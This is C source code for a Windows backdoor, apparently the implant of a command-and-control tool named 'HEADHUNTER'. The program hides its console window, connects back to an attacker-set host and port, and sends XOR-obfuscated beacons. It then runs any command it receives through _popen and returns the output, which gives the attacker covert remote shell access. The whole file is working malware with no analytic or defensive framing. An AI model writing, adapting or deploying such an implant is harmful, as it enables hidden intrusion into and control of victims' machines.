#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "helpers.c"
#include "payload_common.h"

#define MAXBUF 65536
#define SIZE 1024

char* CLIENT_IP = LHOST;
int CLIENT_PORT = PORT;
char* key = KEY;
char buf[MAXBUF];
int bufsize;
int beaconing;
int sleeptime = 5000;

int main(void) {

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		write(2, "[ERROR] WSASturtup failed.\n", 27);
		return (1);
	}

	HWND handle = GetConsoleWindow();
	// Hide
	ShowWindow(handle, SW_HIDE);

	int keylen = strlen(key);
	int n = 0;
	int port = CLIENT_PORT;
	struct sockaddr_in sa;
	int connection_established;
	SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

	#ifdef WAIT_FOR_CLIENT
	while (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		Sleep(5000);
	}
#else
	if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		return (1);
	}
#endif


	char* beacon = "--HEADHUNTER BEACON--";
	char* xorbeacon = XOR(beacon, key, strlen(beacon), keylen);
        	
	while(1)
        {
		
		send(sock, xorbeacon, strlen(beacon), 0);
		n = recv(sock, buf, MAXBUF, 0);

		char* xorbuf = XOR(buf, key, n, keylen);

		if(str_starts_with(xorbuf, "--HEADHUNTER NO--") == 0){
			Sleep(sleeptime);
		}
		else if(str_starts_with(xorbuf, "--HEADHUNTER EXIT--") == 0){
			return 0;
		}
		else{
				
			if(str_starts_with(xorbuf, "shell") == 0)
			{
				char* cmd = split(xorbuf, " ");
				FILE* fp;
				char* terminated;
				fp = _popen(cmd, "r");
				if(fp == NULL) {
				    char* error = "Failed to run command\n";
				    char* xorerror = XOR(error, key, strlen(error), keylen);
				    send(sock, xorerror, strlen(error), 0);
				    free(xorerror);
						    
				}

				char path[2050];
				char command[12000];
				char* reset = "\n";
				while (fgets(path, sizeof(path), fp) != NULL) {
					strncat(command, path, strlen(path));
				}

				strncat(command, reset, strlen(reset));
				char* xordata = XOR(command, key, strlen(command), keylen);
				send(sock, xordata, strlen(command), 0);
				//free(xornewline);
				free(xordata);
				memset(command, '\0', strlen(command));

			}
			
			else if(strncmp(xorbuf, "\n", 1) == 0)
			{
				char* xornewline = XOR("\n", key, 1, keylen);
				send(sock, xornewline, 1, 0);
				free(xornewline);
			}

			else
			{
				char* xorinvalid = XOR(MSG_INVALID, key, strlen(MSG_INVALID), keylen);
				send(sock, xorinvalid, strlen(MSG_INVALID), 0);
				free(xorinvalid);
			}

			memset(buf, '\0', strlen(buf));
			memset(xorbuf, '\0', strlen(xorbuf));

		}
	}
	return (0);
}
